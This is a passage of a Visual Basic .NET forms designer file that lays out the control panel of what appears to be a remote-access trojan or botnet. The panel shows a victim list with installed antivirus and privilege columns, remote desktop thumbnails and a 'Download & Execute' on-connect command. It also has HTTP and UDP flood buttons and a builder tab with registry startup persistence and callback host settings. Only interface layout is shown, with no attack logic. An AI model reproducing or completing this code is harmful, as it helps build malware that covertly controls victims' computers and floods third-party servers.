        Me.lblcMonitor.AutoSize = True
        Me.lblcMonitor.Location = New System.Drawing.Point(8, 26)
        Me.lblcMonitor.Name = "lblcMonitor"
        Me.lblcMonitor.Size = New System.Drawing.Size(0, 13)
        Me.lblcMonitor.TabIndex = 9
        '
        'lblcCountry
        '
        Me.lblcCountry.AutoSize = True
        Me.lblcCountry.Location = New System.Drawing.Point(195, 131)
        Me.lblcCountry.Name = "lblcCountry"
        Me.lblcCountry.Size = New System.Drawing.Size(0, 13)
        Me.lblcCountry.TabIndex = 8
        '
        'lblcAV
        '
        Me.lblcAV.AutoSize = True
        Me.lblcAV.Location = New System.Drawing.Point(195, 147)
        Me.lblcAV.Name = "lblcAV"
        Me.lblcAV.Size = New System.Drawing.Size(0, 13)
        Me.lblcAV.TabIndex = 7
        '
        'lblcLocation
        '
        Me.lblcLocation.AutoSize = True
        Me.lblcLocation.Location = New System.Drawing.Point(195, 58)
        Me.lblcLocation.Name = "lblcLocation"
        Me.lblcLocation.Size = New System.Drawing.Size(0, 13)
        Me.lblcLocation.TabIndex = 6
        '
        'lblcVersion
        '
        Me.lblcVersion.AutoSize = True
        Me.lblcVersion.Location = New System.Drawing.Point(195, 42)
        Me.lblcVersion.Name = "lblcVersion"
        Me.lblcVersion.Size = New System.Drawing.Size(0, 13)
        Me.lblcVersion.TabIndex = 5
        '
        'lblcOS
        '
        Me.lblcOS.AutoSize = True
        Me.lblcOS.Location = New System.Drawing.Point(195, 115)
        Me.lblcOS.Name = "lblcOS"
        Me.lblcOS.Size = New System.Drawing.Size(0, 13)
        Me.lblcOS.TabIndex = 4
        '
        'lblcPCName
        '
        Me.lblcPCName.AutoSize = True
        Me.lblcPCName.Location = New System.Drawing.Point(195, 99)
        Me.lblcPCName.Name = "lblcPCName"
        Me.lblcPCName.Size = New System.Drawing.Size(0, 13)
        Me.lblcPCName.TabIndex = 3
        '
        'lblcUser
        '
        Me.lblcUser.AutoSize = True
        Me.lblcUser.Location = New System.Drawing.Point(195, 83)
        Me.lblcUser.Name = "lblcUser"
        Me.lblcUser.Size = New System.Drawing.Size(0, 13)
        Me.lblcUser.TabIndex = 2
        '
        'lblcIP
        '
        Me.lblcIP.AutoSize = True
        Me.lblcIP.Location = New System.Drawing.Point(195, 26)
        Me.lblcIP.Name = "lblcIP"
        Me.lblcIP.Size = New System.Drawing.Size(0, 13)
        Me.lblcIP.TabIndex = 1
        '
        'pboxDesktop
        '
        Me.pboxDesktop.Location = New System.Drawing.Point(11, 42)
        Me.pboxDesktop.Name = "pboxDesktop"
        Me.pboxDesktop.Size = New System.Drawing.Size(178, 118)
        Me.pboxDesktop.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom
        Me.pboxDesktop.TabIndex = 0
        Me.pboxDesktop.TabStop = False
        '
        'lstConnections
        '
        Me.lstConnections.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader1, Me.ColumnHeader12, Me.ColumnHeader2, Me.ColumnHeader3, Me.ColumnHeader4, Me.ColumnHeader5, Me.ColumnHeader10, Me.ColumnHeader11, Me.ColumnHeader7, Me.Clientname})
        Me.lstConnections.ContextMenuStrip = Me.MenuMain
        Me.lstConnections.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lstConnections.FullRowSelect = True
        Me.lstConnections.HideSelection = False
        Me.lstConnections.LargeImageList = Me.Flags
        Me.lstConnections.Location = New System.Drawing.Point(3, 6)
        Me.lstConnections.Name = "lstConnections"
        Me.lstConnections.Size = New System.Drawing.Size(1091, 310)
        Me.lstConnections.SmallImageList = Me.Flags
        Me.lstConnections.TabIndex = 15
        Me.lstConnections.UseCompatibleStateImageBehavior = False
        Me.lstConnections.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader1
        '
        Me.ColumnHeader1.Text = "Client IP"
        Me.ColumnHeader1.Width = 80
        '
        'ColumnHeader12
        '
        Me.ColumnHeader12.Text = "Ping"
        '
        'ColumnHeader2
        '
        Me.ColumnHeader2.Text = "OS"
        Me.ColumnHeader2.Width = 80
        '
        'ColumnHeader3
        '
        Me.ColumnHeader3.Text = "Country"
        Me.ColumnHeader3.Width = 91
        '
        'ColumnHeader4
        '
        Me.ColumnHeader4.Text = "Installed AV"
        Me.ColumnHeader4.Width = 98
        '
        'ColumnHeader5
        '
        Me.ColumnHeader5.Text = "WhoAmI"
        Me.ColumnHeader5.Width = 63
        '
        'ColumnHeader10
        '
        Me.ColumnHeader10.Text = "Version"
        Me.ColumnHeader10.Width = 58
        '
        'ColumnHeader11
        '
        Me.ColumnHeader11.Text = "Rights"
        Me.ColumnHeader11.Width = 53
        '
        'ColumnHeader7
        '
        Me.ColumnHeader7.DisplayIndex = 9
        Me.ColumnHeader7.Text = "# of Cores"
        Me.ColumnHeader7.Width = 84
        '
        'Clientname
        '
        Me.Clientname.DisplayIndex = 8
        Me.Clientname.Text = "cname"
        Me.Clientname.Width = 0
        '
        'TabPage15
        '
        Me.TabPage15.BackColor = System.Drawing.Color.White
        Me.TabPage15.Controls.Add(Me.lstDesktops)
        Me.TabPage15.ImageIndex = 6
        Me.TabPage15.Location = New System.Drawing.Point(124, 4)
        Me.TabPage15.Name = "TabPage15"
        Me.TabPage15.Size = New System.Drawing.Size(1102, 521)
        Me.TabPage15.TabIndex = 6
        Me.TabPage15.Text = "Thumbnails"
        '
        'lstDesktops
        '
        Me.lstDesktops.LargeImageList = Me.Desktops
        Me.lstDesktops.Location = New System.Drawing.Point(3, 6)
        Me.lstDesktops.MultiSelect = False
        Me.lstDesktops.Name = "lstDesktops"
        Me.lstDesktops.Size = New System.Drawing.Size(1096, 494)
        Me.lstDesktops.TabIndex = 0
        Me.lstDesktops.UseCompatibleStateImageBehavior = False
        '
        'TabPage6
        '
        Me.TabPage6.BackColor = System.Drawing.Color.White
        Me.TabPage6.Controls.Add(Me.cmbWho)
        Me.TabPage6.Controls.Add(Me.Label16)
        Me.TabPage6.Controls.Add(Me.cmbCommand)
        Me.TabPage6.Controls.Add(Me.lstOnConnect)
        Me.TabPage6.ImageIndex = 5
        Me.TabPage6.Location = New System.Drawing.Point(124, 4)
        Me.TabPage6.Name = "TabPage6"
        Me.TabPage6.Size = New System.Drawing.Size(1102, 521)
        Me.TabPage6.TabIndex = 5
        Me.TabPage6.Text = "OnConnect"
        '
        'cmbWho
        '
        Me.cmbWho.Enabled = False
        Me.cmbWho.FormattingEnabled = True
        Me.cmbWho.Items.AddRange(New Object() {"All", "Admin", "User"})
        Me.cmbWho.Location = New System.Drawing.Point(257, 474)
        Me.cmbWho.Name = "cmbWho"
        Me.cmbWho.Size = New System.Drawing.Size(121, 21)
        Me.cmbWho.TabIndex = 3
        '
        'Label16
        '
        Me.Label16.AutoSize = True
        Me.Label16.Location = New System.Drawing.Point(214, 477)
        Me.Label16.Name = "Label16"
        Me.Label16.Size = New System.Drawing.Size(37, 13)
        Me.Label16.TabIndex = 2
        Me.Label16.Text = "Who:"
        '
        'cmbCommand
        '
        Me.cmbCommand.FormattingEnabled = True
        Me.cmbCommand.Items.AddRange(New Object() {"Download & Execute", "Show Messagebox", "Disconnect", "Uninstall"})
        Me.cmbCommand.Location = New System.Drawing.Point(13, 474)
        Me.cmbCommand.Name = "cmbCommand"
        Me.cmbCommand.Size = New System.Drawing.Size(166, 21)
        Me.cmbCommand.TabIndex = 1
        Me.cmbCommand.Text = "Select Command"
        '
        'lstOnConnect
        '
        Me.lstOnConnect.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader9, Me.ColumnHeader13, Me.ColumnHeader14})
        Me.lstOnConnect.ContextMenuStrip = Me.MenuOnConnect
        Me.lstOnConnect.FullRowSelect = True
        Me.lstOnConnect.Location = New System.Drawing.Point(13, 8)
        Me.lstOnConnect.Name = "lstOnConnect"
        Me.lstOnConnect.Size = New System.Drawing.Size(1081, 460)
        Me.lstOnConnect.TabIndex = 0
        Me.lstOnConnect.UseCompatibleStateImageBehavior = False
        Me.lstOnConnect.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader9
        '
        Me.ColumnHeader9.Text = "Command"
        Me.ColumnHeader9.Width = 565
        '
        'ColumnHeader13
        '
        Me.ColumnHeader13.Text = "Who"
        Me.ColumnHeader13.Width = 150
        '
        'ColumnHeader14
        '
        Me.ColumnHeader14.Text = "Parameters"
        Me.ColumnHeader14.Width = 307
        '
        'TabPage8
        '
        Me.TabPage8.BackColor = System.Drawing.Color.White
        Me.TabPage8.Controls.Add(Me.cmdstartUDP)
        Me.TabPage8.Controls.Add(Me.cmdstartHTTP)
        Me.TabPage8.Controls.Add(Me.txtStressLog)
        Me.TabPage8.Controls.Add(Me.lstDDoS)
        Me.TabPage8.ImageIndex = 1
        Me.TabPage8.Location = New System.Drawing.Point(124, 4)
        Me.TabPage8.Name = "TabPage8"
        Me.TabPage8.Size = New System.Drawing.Size(1102, 521)
        Me.TabPage8.TabIndex = 8
        Me.TabPage8.Text = "DDoS"
        '
        'cmdstartUDP
        '
        Me.cmdstartUDP.Image = CType(resources.GetObject("cmdstartUDP.Image"), System.Drawing.Image)
        Me.cmdstartUDP.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.cmdstartUDP.Location = New System.Drawing.Point(152, 8)
        Me.cmdstartUDP.Name = "cmdstartUDP"
        Me.cmdstartUDP.Size = New System.Drawing.Size(143, 23)
        Me.cmdstartUDP.TabIndex = 3
        Me.cmdstartUDP.Text = "Start UDP Flood"
        Me.cmdstartUDP.UseVisualStyleBackColor = True
        '
        'cmdstartHTTP
        '
        Me.cmdstartHTTP.Image = CType(resources.GetObject("cmdstartHTTP.Image"), System.Drawing.Image)
        Me.cmdstartHTTP.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.cmdstartHTTP.Location = New System.Drawing.Point(3, 8)
        Me.cmdstartHTTP.Name = "cmdstartHTTP"
        Me.cmdstartHTTP.Size = New System.Drawing.Size(143, 23)
        Me.cmdstartHTTP.TabIndex = 2
        Me.cmdstartHTTP.Text = "Start HTTP Flood"
        Me.cmdstartHTTP.UseVisualStyleBackColor = True
        '
        'txtStressLog
        '
        Me.txtStressLog.BackColor = System.Drawing.Color.White
        Me.txtStressLog.Location = New System.Drawing.Point(791, 8)
        Me.txtStressLog.Multiline = True
        Me.txtStressLog.Name = "txtStressLog"
        Me.txtStressLog.ReadOnly = True
        Me.txtStressLog.Size = New System.Drawing.Size(303, 492)
        Me.txtStressLog.TabIndex = 1
        '
        'lstDDoS
        '
        Me.lstDDoS.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader6})
        Me.lstDDoS.ContextMenuStrip = Me.ContextMenuStrip1
        Me.lstDDoS.Location = New System.Drawing.Point(3, 36)
        Me.lstDDoS.MultiSelect = False
        Me.lstDDoS.Name = "lstDDoS"
        Me.lstDDoS.Size = New System.Drawing.Size(782, 464)
        Me.lstDDoS.TabIndex = 0
        Me.lstDDoS.UseCompatibleStateImageBehavior = False
        Me.lstDDoS.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader6
        '
        Me.ColumnHeader6.Text = "DDoS"
        Me.ColumnHeader6.Width = 654
        '
        'TabPage9
        '
        Me.TabPage9.BackColor = System.Drawing.Color.White
        Me.TabPage9.Controls.Add(Me.txtmap2)
        Me.TabPage9.Controls.Add(Me.txtmap1)
        Me.TabPage9.Controls.Add(Me.WebBrowser1)
        Me.TabPage9.ImageIndex = 8
        Me.TabPage9.Location = New System.Drawing.Point(124, 4)
        Me.TabPage9.Name = "TabPage9"
        Me.TabPage9.Size = New System.Drawing.Size(1102, 521)
        Me.TabPage9.TabIndex = 9
        Me.TabPage9.Text = "Clientmap"
        '
        'txtmap2
        '
        Me.txtmap2.Location = New System.Drawing.Point(501, 250)
        Me.txtmap2.Multiline = True
        Me.txtmap2.Name = "txtmap2"
        Me.txtmap2.Size = New System.Drawing.Size(100, 20)
        Me.txtmap2.TabIndex = 2
        Me.txtmap2.Text = resources.GetString("txtmap2.Text")
        Me.txtmap2.Visible = False
        '
        'txtmap1
        '
        Me.txtmap1.Location = New System.Drawing.Point(134, 73)
        Me.txtmap1.Multiline = True
        Me.txtmap1.Name = "txtmap1"
        Me.txtmap1.Size = New System.Drawing.Size(100, 20)
        Me.txtmap1.TabIndex = 1
        Me.txtmap1.Text = resources.GetString("txtmap1.Text")
        Me.txtmap1.Visible = False
        '
        'WebBrowser1
        '
        Me.WebBrowser1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.WebBrowser1.Location = New System.Drawing.Point(0, 0)
        Me.WebBrowser1.MinimumSize = New System.Drawing.Size(20, 20)
        Me.WebBrowser1.Name = "WebBrowser1"
        Me.WebBrowser1.Size = New System.Drawing.Size(1102, 521)
        Me.WebBrowser1.TabIndex = 0
        '
        'TabPage2
        '
        Me.TabPage2.BackColor = System.Drawing.Color.White
        Me.TabPage2.Controls.Add(Me.GroupBox7)
        Me.TabPage2.Controls.Add(Me.GroupBox6)
        Me.TabPage2.ImageIndex = 2
        Me.TabPage2.Location = New System.Drawing.Point(124, 4)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(1102, 521)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "Settings"
        '
        'GroupBox7
        '
        Me.GroupBox7.Controls.Add(Me.cmdAddPort)
        Me.GroupBox7.Controls.Add(Me.txtExtPort)
        Me.GroupBox7.Controls.Add(Me.Label22)
        Me.GroupBox7.Controls.Add(Me.lstPorts)
        Me.GroupBox7.Location = New System.Drawing.Point(370, 17)
        Me.GroupBox7.Name = "GroupBox7"
        Me.GroupBox7.Size = New System.Drawing.Size(483, 331)
        Me.GroupBox7.TabIndex = 52
        Me.GroupBox7.TabStop = False
        Me.GroupBox7.Text = "uPnP Forwarding"
        '
        'cmdAddPort
        '
        Me.cmdAddPort.Image = CType(resources.GetObject("cmdAddPort.Image"), System.Drawing.Image)
        Me.cmdAddPort.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.cmdAddPort.Location = New System.Drawing.Point(123, 18)
        Me.cmdAddPort.Name = "cmdAddPort"
        Me.cmdAddPort.Size = New System.Drawing.Size(96, 23)
        Me.cmdAddPort.TabIndex = 5
        Me.cmdAddPort.Text = "Add Port"
        Me.cmdAddPort.UseVisualStyleBackColor = True
        '
        'txtExtPort
        '
        Me.txtExtPort.Location = New System.Drawing.Point(47, 20)
        Me.txtExtPort.Name = "txtExtPort"
        Me.txtExtPort.Size = New System.Drawing.Size(70, 20)
        Me.txtExtPort.TabIndex = 2
        '
        'Label22
        '
        Me.Label22.AutoSize = True
        Me.Label22.Location = New System.Drawing.Point(6, 23)
        Me.Label22.Name = "Label22"
        Me.Label22.Size = New System.Drawing.Size(35, 13)
        Me.Label22.TabIndex = 1
        Me.Label22.Text = "Port:"
        '
        'lstPorts
        '
        Me.lstPorts.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader18})
        Me.lstPorts.ContextMenuStrip = Me.ContextMenuStrip2
        Me.lstPorts.FullRowSelect = True
        Me.lstPorts.Location = New System.Drawing.Point(6, 49)
        Me.lstPorts.MultiSelect = False
        Me.lstPorts.Name = "lstPorts"
        Me.lstPorts.Size = New System.Drawing.Size(471, 266)
        Me.lstPorts.TabIndex = 0
        Me.lstPorts.UseCompatibleStateImageBehavior = False
        Me.lstPorts.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader18
        '
        Me.ColumnHeader18.Text = "Port"
        Me.ColumnHeader18.Width = 191
        '
        'GroupBox6
        '
        Me.GroupBox6.Controls.Add(Me.cmdListen)
        Me.GroupBox6.Controls.Add(Me.PictureBox12)
        Me.GroupBox6.Controls.Add(Me.PictureBox11)
        Me.GroupBox6.Controls.Add(Me.PictureBox10)
        Me.GroupBox6.Controls.Add(Me.PictureBox9)
        Me.GroupBox6.Controls.Add(Me.txthost)
        Me.GroupBox6.Controls.Add(Me.Label6)
        Me.GroupBox6.Controls.Add(Me.Label2)
        Me.GroupBox6.Controls.Add(Me.chkPasswd)
        Me.GroupBox6.Controls.Add(Me.chkListen)
        Me.GroupBox6.Controls.Add(Me.btnSave)
        Me.GroupBox6.Controls.Add(Me.txtDataPort)
        Me.GroupBox6.Controls.Add(Me.txtPasswd)
        Me.GroupBox6.Controls.Add(Me.txtPort)
        Me.GroupBox6.Controls.Add(Me.Label7)
        Me.GroupBox6.Controls.Add(Me.Label5)
        Me.GroupBox6.Controls.Add(Me.Label4)
        Me.GroupBox6.Controls.Add(Me.Label3)
        Me.GroupBox6.Location = New System.Drawing.Point(6, 17)
        Me.GroupBox6.Name = "GroupBox6"
        Me.GroupBox6.Size = New System.Drawing.Size(358, 331)
        Me.GroupBox6.TabIndex = 51
        Me.GroupBox6.TabStop = False
        Me.GroupBox6.Text = "Settings"
        '
        'cmdListen
        '
        Me.cmdListen.Location = New System.Drawing.Point(283, 76)
        Me.cmdListen.Name = "cmdListen"
        Me.cmdListen.Size = New System.Drawing.Size(53, 45)
        Me.cmdListen.TabIndex = 66
        Me.cmdListen.Text = "Listen"
        Me.cmdListen.UseVisualStyleBackColor = True
        '
        'PictureBox12
        '
        Me.PictureBox12.Image = CType(resources.GetObject("PictureBox12.Image"), System.Drawing.Image)
        Me.PictureBox12.Location = New System.Drawing.Point(9, 27)
        Me.PictureBox12.Name = "PictureBox12"
        Me.PictureBox12.Size = New System.Drawing.Size(16, 16)
        Me.PictureBox12.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize
        Me.PictureBox12.TabIndex = 65
        Me.PictureBox12.TabStop = False
        '
        'PictureBox11
        '
        Me.PictureBox11.Image = CType(resources.GetObject("PictureBox11.Image"), System.Drawing.Image)
        Me.PictureBox11.Location = New System.Drawing.Point(9, 105)
        Me.PictureBox11.Name = "PictureBox11"
        Me.PictureBox11.Size = New System.Drawing.Size(16, 16)
        Me.PictureBox11.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize
        Me.PictureBox11.TabIndex = 64
        Me.PictureBox11.TabStop = False
        '
        'PictureBox10
        '
        Me.PictureBox10.Image = CType(resources.GetObject("PictureBox10.Image"), System.Drawing.Image)
        Me.PictureBox10.Location = New System.Drawing.Point(9, 79)
        Me.PictureBox10.Name = "PictureBox10"
        Me.PictureBox10.Size = New System.Drawing.Size(16, 16)
        Me.PictureBox10.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize
        Me.PictureBox10.TabIndex = 63
        Me.PictureBox10.TabStop = False
        '
        'PictureBox9
        '
        Me.PictureBox9.Image = CType(resources.GetObject("PictureBox9.Image"), System.Drawing.Image)
        Me.PictureBox9.Location = New System.Drawing.Point(9, 158)
        Me.PictureBox9.Name = "PictureBox9"
        Me.PictureBox9.Size = New System.Drawing.Size(16, 16)
        Me.PictureBox9.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize
        Me.PictureBox9.TabIndex = 62
        Me.PictureBox9.TabStop = False
        '
        'txthost
        '
        Me.txthost.Location = New System.Drawing.Point(135, 26)
        Me.txthost.Name = "txthost"
        Me.txthost.Size = New System.Drawing.Size(184, 20)
        Me.txthost.TabIndex = 54
        Me.txthost.Text = "yourhost.noip.me"
        '
        'Label6
        '
        Me.Label6.AutoSize = True
        Me.Label6.Location = New System.Drawing.Point(120, 127)
        Me.Label6.Name = "Label6"
        Me.Label6.Size = New System.Drawing.Size(86, 13)
        Me.Label6.TabIndex = 60
        Me.Label6.Text = "Example: 777"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(136, 49)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(216, 13)
        Me.Label2.TabIndex = 58
        Me.Label2.Text = "Example: example.com or 127.0.0.1"
        '
        'chkPasswd
        '
        Me.chkPasswd.AutoSize = True
        Me.chkPasswd.Location = New System.Drawing.Point(135, 242)
        Me.chkPasswd.Name = "chkPasswd"
        Me.chkPasswd.Size = New System.Drawing.Size(105, 17)
        Me.chkPasswd.TabIndex = 57
        Me.chkPasswd.Text = "Use Password"
        Me.chkPasswd.UseVisualStyleBackColor = True
        '
        'chkListen
        '
        Me.chkListen.AutoSize = True
        Me.chkListen.Location = New System.Drawing.Point(135, 219)
        Me.chkListen.Name = "chkListen"
        Me.chkListen.Size = New System.Drawing.Size(123, 17)
        Me.chkListen.TabIndex = 56
        Me.chkListen.Text = "Listen on Startup"
        Me.chkListen.UseVisualStyleBackColor = True
        '
        'btnSave
        '
        Me.btnSave.Location = New System.Drawing.Point(17, 278)
        Me.btnSave.Name = "btnSave"
        Me.btnSave.Size = New System.Drawing.Size(276, 37)
        Me.btnSave.TabIndex = 52
        Me.btnSave.Text = "Save"
        Me.btnSave.UseVisualStyleBackColor = True
        '
        'txtDataPort
        '
        Me.txtDataPort.Location = New System.Drawing.Point(135, 103)
        Me.txtDataPort.Name = "txtDataPort"
        Me.txtDataPort.Size = New System.Drawing.Size(142, 20)
        Me.txtDataPort.TabIndex = 51
        Me.txtDataPort.Text = "778"
        '
        'txtPasswd
        '
        Me.txtPasswd.Location = New System.Drawing.Point(135, 157)
        Me.txtPasswd.Name = "txtPasswd"
        Me.txtPasswd.PasswordChar = Global.Microsoft.VisualBasic.ChrW(42)
        Me.txtPasswd.Size = New System.Drawing.Size(184, 20)
        Me.txtPasswd.TabIndex = 50
        '
        'txtPort
        '
        Me.txtPort.Location = New System.Drawing.Point(135, 78)
        Me.txtPort.Name = "txtPort"
        Me.txtPort.Size = New System.Drawing.Size(142, 20)
        Me.txtPort.TabIndex = 49
        Me.txtPort.Text = "777"
        '
        'Label7
        '
        Me.Label7.AutoSize = True
        Me.Label7.Location = New System.Drawing.Point(24, 160)
        Me.Label7.Name = "Label7"
        Me.Label7.Size = New System.Drawing.Size(66, 13)
        Me.Label7.TabIndex = 61
        Me.Label7.Text = "Password:"
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.Location = New System.Drawing.Point(24, 81)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(35, 13)
        Me.Label5.TabIndex = 59
        Me.Label5.Text = "Port:"
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Location = New System.Drawing.Point(24, 29)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(105, 13)
        Me.Label4.TabIndex = 55
        Me.Label4.Text = "Host/IP-Address:"
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Location = New System.Drawing.Point(24, 107)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(66, 13)
        Me.Label3.TabIndex = 53
        Me.Label3.Text = "Data Port:"
        '
        'TabPage3
        '
        Me.TabPage3.BackColor = System.Drawing.Color.White
        Me.TabPage3.Controls.Add(Me.TabControl1)
        Me.TabPage3.ImageIndex = 3
        Me.TabPage3.Location = New System.Drawing.Point(124, 4)
        Me.TabPage3.Name = "TabPage3"
        Me.TabPage3.Size = New System.Drawing.Size(1102, 521)
        Me.TabPage3.TabIndex = 2
        Me.TabPage3.Text = "Builder"
        '
        'TabControl1
        '
        Me.TabControl1.Controls.Add(Me.TabPage17)
        Me.TabControl1.Controls.Add(Me.TabPage18)
        Me.TabControl1.Controls.Add(Me.TabPage19)
        Me.TabControl1.Controls.Add(Me.TabPage20)
        Me.TabControl1.Location = New System.Drawing.Point(3, 3)
        Me.TabControl1.Name = "TabControl1"
        Me.TabControl1.SelectedIndex = 0
        Me.TabControl1.Size = New System.Drawing.Size(1081, 497)
        Me.TabControl1.TabIndex = 18
        '
        'TabPage17
        '
        Me.TabPage17.Controls.Add(Me.GroupBox1)
        Me.TabPage17.Location = New System.Drawing.Point(4, 22)
        Me.TabPage17.Name = "TabPage17"
        Me.TabPage17.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage17.Size = New System.Drawing.Size(1073, 471)
        Me.TabPage17.TabIndex = 0
        Me.TabPage17.Text = "Connection"
        Me.TabPage17.UseVisualStyleBackColor = True
        '
        'GroupBox1
        '
        Me.GroupBox1.Controls.Add(Me.Label33)
        Me.GroupBox1.Controls.Add(Me.txtbackuphost)
        Me.GroupBox1.Controls.Add(Me.Label17)
        Me.GroupBox1.Controls.Add(Me.txtbuildgroup)
        Me.GroupBox1.Controls.Add(Me.Label20)
        Me.GroupBox1.Controls.Add(Me.txtbuildport)
        Me.GroupBox1.Controls.Add(Me.txtbuildpasswd)
        Me.GroupBox1.Controls.Add(Me.Label18)
        Me.GroupBox1.Controls.Add(Me.Label19)
        Me.GroupBox1.Controls.Add(Me.txtbuildhost)
        Me.GroupBox1.Location = New System.Drawing.Point(3, 6)
        Me.GroupBox1.Name = "GroupBox1"
        Me.GroupBox1.Size = New System.Drawing.Size(294, 175)
        Me.GroupBox1.TabIndex = 8
        Me.GroupBox1.TabStop = False
        Me.GroupBox1.Text = "Connection"
        '
        'Label33
        '
        Me.Label33.AutoSize = True
        Me.Label33.Location = New System.Drawing.Point(7, 49)
        Me.Label33.Name = "Label33"
        Me.Label33.Size = New System.Drawing.Size(83, 13)
        Me.Label33.TabIndex = 21
        Me.Label33.Text = "Backup Host:"
        '
        'txtbackuphost
        '
        Me.txtbackuphost.Location = New System.Drawing.Point(91, 46)
        Me.txtbackuphost.Name = "txtbackuphost"
        Me.txtbackuphost.Size = New System.Drawing.Size(147, 20)
        Me.txtbackuphost.TabIndex = 20
        Me.txtbackuphost.Text = "127.0.0.1"
        '
        'Label17
        '
        Me.Label17.AutoSize = True
        Me.Label17.Location = New System.Drawing.Point(7, 127)
        Me.Label17.Name = "Label17"
        Me.Label17.Size = New System.Drawing.Size(79, 13)
        Me.Label17.TabIndex = 19
        Me.Label17.Text = "Groupname:"
        '
        'txtbuildgroup
        '
        Me.txtbuildgroup.Location = New System.Drawing.Point(91, 124)
        Me.txtbuildgroup.Name = "txtbuildgroup"
        Me.txtbuildgroup.Size = New System.Drawing.Size(147, 20)
        Me.txtbuildgroup.TabIndex = 18
        Me.txtbuildgroup.Text = "Default"
        '
        'Label20
        '
        Me.Label20.AutoSize = True
        Me.Label20.Location = New System.Drawing.Point(7, 75)
        Me.Label20.Name = "Label20"
        Me.Label20.Size = New System.Drawing.Size(35, 13)
        Me.Label20.TabIndex = 15
        Me.Label20.Text = "Port:"
        '
        'txtbuildport
        '
        Me.txtbuildport.Location = New System.Drawing.Point(91, 72)
        Me.txtbuildport.Name = "txtbuildport"
        Me.txtbuildport.Size = New System.Drawing.Size(147, 20)
        Me.txtbuildport.TabIndex = 14
        Me.txtbuildport.Text = "777"
        '
        'txtbuildpasswd
        '
        Me.txtbuildpasswd.Location = New System.Drawing.Point(91, 98)
        Me.txtbuildpasswd.Name = "txtbuildpasswd"
        Me.txtbuildpasswd.PasswordChar = Global.Microsoft.VisualBasic.ChrW(42)
        Me.txtbuildpasswd.Size = New System.Drawing.Size(147, 20)
        Me.txtbuildpasswd.TabIndex = 12
        Me.txtbuildpasswd.Text = "passwd"
        '
        'Label18
        '
        Me.Label18.AutoSize = True
        Me.Label18.Location = New System.Drawing.Point(6, 101)
        Me.Label18.Name = "Label18"
        Me.Label18.Size = New System.Drawing.Size(66, 13)
        Me.Label18.TabIndex = 11
        Me.Label18.Text = "Password:"
        '
        'Label19
        '
        Me.Label19.AutoSize = True
        Me.Label19.Location = New System.Drawing.Point(7, 23)
        Me.Label19.Name = "Label19"
        Me.Label19.Size = New System.Drawing.Size(54, 13)
        Me.Label19.TabIndex = 10
        Me.Label19.Text = "Host/IP:"
        '
        'txtbuildhost
        '
        Me.txtbuildhost.Location = New System.Drawing.Point(91, 20)
        Me.txtbuildhost.Name = "txtbuildhost"
        Me.txtbuildhost.Size = New System.Drawing.Size(147, 20)
        Me.txtbuildhost.TabIndex = 9
        Me.txtbuildhost.Text = "127.0.0.1"
        '
        'TabPage18
        '
        Me.TabPage18.Controls.Add(Me.GroupBox2)
        Me.TabPage18.Controls.Add(Me.GroupBox9)
        Me.TabPage18.Controls.Add(Me.GroupBox10)
        Me.TabPage18.Location = New System.Drawing.Point(4, 22)
        Me.TabPage18.Name = "TabPage18"
        Me.TabPage18.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage18.Size = New System.Drawing.Size(1073, 471)
        Me.TabPage18.TabIndex = 1
        Me.TabPage18.Text = "Process and Install "
        Me.TabPage18.UseVisualStyleBackColor = True
        '
        'GroupBox2
        '
        Me.GroupBox2.Controls.Add(Me.cmbRunOnce)
        Me.GroupBox2.Controls.Add(Me.Label21)
        Me.GroupBox2.Controls.Add(Me.txtstartupLM)
        Me.GroupBox2.Controls.Add(Me.PictureBox13)
        Me.GroupBox2.Controls.Add(Me.chkHKLM)
        Me.GroupBox2.Controls.Add(Me.chkHKCU)
        Me.GroupBox2.Controls.Add(Me.Label1)
        Me.GroupBox2.Controls.Add(Me.chkinstall)
        Me.GroupBox2.Controls.Add(Me.PictureBox8)
        Me.GroupBox2.Controls.Add(Me.PictureBox7)
        Me.GroupBox2.Controls.Add(Me.Label41)
        Me.GroupBox2.Controls.Add(Me.txtFolder)
        Me.GroupBox2.Controls.Add(Me.RadioButton3)
        Me.GroupBox2.Controls.Add(Me.RadioButton1)
        Me.GroupBox2.Controls.Add(Me.RadioButton2)
        Me.GroupBox2.Controls.Add(Me.Label32)
        Me.GroupBox2.Controls.Add(Me.txtstartup)
        Me.GroupBox2.Controls.Add(Me.txtname)
        Me.GroupBox2.Location = New System.Drawing.Point(6, 6)
        Me.GroupBox2.Name = "GroupBox2"
        Me.GroupBox2.Size = New System.Drawing.Size(316, 245)
